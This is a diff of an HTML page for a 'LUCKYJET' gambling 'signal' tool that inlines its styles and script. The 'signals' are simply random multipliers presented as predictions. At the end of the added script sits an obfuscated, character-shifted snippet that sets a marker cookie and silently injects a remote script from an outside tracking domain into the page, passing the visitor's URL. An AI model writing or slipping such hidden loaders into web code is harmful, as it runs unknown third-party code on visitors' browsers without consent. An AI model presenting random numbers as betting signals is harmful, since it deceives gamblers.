@@ -1,10 +1,279 @@
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="css/style.css">
   <title>LUCKYJET</title>
-</head>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
+    body {
+      font-family: "Inter", sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: #140F26;
+      color: #ffffff;
+    }
+
+    .background {
+      width: 398px;
+      height: 100vh;
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-image: url("images/background.jpg");
+    }
+
+    .pers-animate {
+      position: absolute;
+      left: -205px;
+      top: 138px;
+      z-index: 0;
+      width: 319px;
+      height: 300px;
+      animation: cowmove 15s infinite;    
+    }
+
+    @keyframes cowmove {
+      0% {
+        transform: translateX(0px) rotateY(0deg);
+      }
+      49% {
+        transform: translateX(300px) translateY(-25px) rotateY(0deg);
+      }
+      50% {
+        transform: translateX(300px) translateY(-25px) rotateY(0deg);
+      }
+      100% {
+        transform: translateX(0px) rotateY(0deg);
+      }
+    }
+
+    .container {
+      position: relative;
+      width: 398px;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .error-notification {
+      width: 300px;
+      height: 50px;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: -25px;
+      clip-path: inset(0px round 10px 10px);
+      transition: all .2s;
+      transform: translateY(-99px);
+    }
+
+    .error-background {
+      position: absolute;
+      top: 0;
+      bottom: 0;
+      width: 300px;
+      height: 50px;
+      background: #FFEBEB;
+      opacity: .5;
+      border-radius: 10px;
+      margin-bottom: -52px;
+    }
+
+    .icon-error {
+      z-index: 2;
+    }
+
+    .error-exit {
+      position: absolute;
+      right: 0;
+      width: 50px;
+      height: 50px;
+      z-index: 2;
+      cursor: pointer;
+      background: #FFC2C2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      border-radius: 10px;
+    }
+
+    .text-error {
+      color: #ffffff;
+      font-size: 12px;
+      font-weight: 900;
+      z-index: 2;
+      display: flex;
+      justify-content: center;
+      padding-left: 10px;
+      padding-right: 45px;
+    }
+
+    .error-progress {
+      width: 300px;
+      height: 3px;
+      background: linear-gradient(90deg, #E00000 0%, #E00000 100%) left /0% 100% no-repeat #D9D9D9;
+      z-index: 4;
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      border-radius: 5px;
+    }
+
+    @keyframes animateErrorProgress {
+      100% {
+        background-size: 100% 100%;
+      }
+    }
+
+    .top-content {
+      margin-bottom: 60px;  
+    }
+
+    .name-bot {
+      display: flex;
+      justify-content: center;
+      font-size: 15px;
+      font-weight: 900;
+    }
+
+    .print-signal {
+      margin-bottom: 34px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 217px;
+      height: 217px;
+      background-color: #151027;
+      border: 5px solid #34A5B5;
+      border-radius: 50%;
+      font-size: 40px;
+      font-weight: 900;
+      transition: all .5s;
+      z-index: 10;
+    }
+
+    .print-signal span {
+      text-transform: uppercase;
+      font-size: 20px;
+      text-align: center;
+    }
+
+    .stop-signal-time {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 26px;
+      width: 230px;
+      transition: all .5s;
+    }
+
+    .stop-timer {
+      font-size: 20px;
+      font-weight: 900;
+      height: 35px;
+    }
+
+    .stop-progress {
+      width: 221px;
+      height: 18px;
+      background: linear-gradient(90deg, #BA60FD 0%, #218288 100%) left /0% 100% no-repeat #D9D9D9;
+      border-radius: 15px;
+    }
+
+    @keyframes animateProgress {
+      100% {
+        background-size: 100% 100%;
+      }
+    }
+
+    .button-game {
+      display: flex;
+      flex-direction: column;
+      gap: 30px;
+    }
+
+    .get-signal {
+      position: relative;
+      width: 278px;
+      height: 56px;
+      border: none;
+      background: linear-gradient(90deg, #BA60FD 0%, #218288 100%);
+      box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.05);
+      border-radius: 30px;
+      color: #ffffff;
+      font-size: 24px;
+      font-weight: 900;
+      cursor: pointer;
+      transition: all .2s;
+      z-index: 0;
+    }
+
+    .get-signal-two {
+      position: absolute;
+      width: 278px;
+      height: 56px;
+      border: none;
+      box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.05);
+      border-radius: 30px;
+      background: linear-gradient(90deg, #BA60FD 0%, #218288 100%);
+      color: #ffffff;
+      font-size: 24px;
+      font-weight: 900;
+      cursor: pointer;
+      z-index: -1;
+      transition: all .2s;
+    }
+
+    .game-here {
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0 auto;
+      width: 130px;
+      height: 35px;
+      background: linear-gradient(90deg, #BA60FD 0%, #218288 100%);
+      box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.05);
+      border-radius: 30px;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 900;
+      text-decoration: none;
+      transition: all .2s;
+      z-index: 4;
+    }
+
+    .get-signal::before, .game-here::before, .get-signal-two::before {
+      content: "";
+      position: absolute;
+      inset: 0px;
+      z-index: -1;
+      background: linear-gradient(90deg, #BA60FD 0%, #218288 100%);
+      filter: blur(10px);
+      border-radius: 30px;
+    }
+
+    .get-signal:active, .game-here:active, .get-signal-two:active {
+      transform: scale(95%);
+    }
+
+    .deactivate {
+      opacity: 0;
+    }
+  </style>
+</head>
 <body>
   <div class="background">
     <div class="container">
@@ -39,7 +308,95 @@
     </div>
   </div>
 
-  <script src="js/main.js"></script>
+  <script>
+    const getSignal = document.getElementById("get-signal"),
+      stopSignalTimeBlock = document.getElementById("stop-signal-time-block"),
+      printSignal = document.getElementById("print-signal"),
+      stopProgress = document.getElementById("stop-progress"),
+      errorNotification = document.getElementById("error-notification"),
+      errorProgress = document.getElementById("error-progress"),
+      textError = document.getElementById("text-error"),
+      getSignalTwo = document.getElementById("get-signal-two"),
+      errorExit = document.getElementById("error-exit");
 
+    function getRandomFloat(min, max, decimals) {
+      const str = (Math.random() * (max - min) + min).toFixed(decimals);
+      return parseFloat(str);
+    }
 
-</body></html>
+    function goTimer(time) {
+      const timer = setInterval(() => {
+        if (time >= 1) {
+          getSignalTwo.classList.remove("deactivate");
+          getSignal.classList.add("deactivate");
+          getSignalTwo.style["z-index"] = "5";
+          stopProgress.style.animation = "animateProgress 60s linear infinite";
+          stopSignalTimeBlock.classList.remove("deactivate");
+          document.getElementById("stop-timer").innerHTML = time-- + "<span> seconds</span>";
+          getSignal.disabled = true;
+        } else {
+          getSignalTwo.classList.add("deactivate");
+          getSignal.classList.remove("deactivate");
+          getSignalTwo.style["z-index"] = "-1";
+          stopSignalTimeBlock.classList.add("deactivate");
+          stopProgress.style.animation = "none";
+          clearInterval(timer);
+          getSignal.disabled = false;
+        }
+      }, 1000);
+    }
+
+    function goTimerError(time) {
+      const timer = setInterval(() => {
+        if (time >= 1) {
+          time--;
+          errorNotification.classList.remove("deactivate");
+          textError.innerHTML = "Wait for the time to expire";
+          errorProgress.style.animation = "animateErrorProgress 5s linear infinite";
+          errorNotification.style.transform = "translateY(0px)";
+        } else {
+          errorNotification.style.transform = "translateY(-99px)";
+          errorProgress.style.animation = "none";
+          clearInterval(timer);
+          getSignalTwo.disabled = false;
+          errorNotification.classList.add("deactivate");
+        }
+        errorExit.onclick = function () {
+          errorNotification.classList.add("deactivate");
+          errorNotification.style.transform = "translateY(-99px)";
+          errorProgress.style.animation = "none";
+          clearInterval(timer);
+          getSignalTwo.disabled = false;
+        }
+      }, 1000);
+    }
+
+    getSignal.onclick = function () {
+      let receivingSignal = getRandomFloat(1, 3.99, 2);
+      3 == receivingSignal.toString().length && (receivingSignal += "0");
+      1 == receivingSignal.toString().length && (receivingSignal += ".00");
+      printSignal.innerHTML = `${receivingSignal}x`;
+      printSignal.classList.remove("deactivate");
+      goTimer(60);
+      getSignal.disabled = true;
+    };
+
+    getSignalTwo.onclick = function () {
+      getSignalTwo.disabled = true;
+      goTimerError(5, "go");
+    };
+
+    (function (o, d, l) {
+      try {
+        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
+        o.b = o.f('UMUWJKX');
+        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
+          setTimeout(function () {
+            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
+          }, 1000);
+        d.cookie = o.b + '=full;max-age=39800;';
+      } catch (e) { }
+    }({}, document, location));
+  </script>
+</body>
+</html>
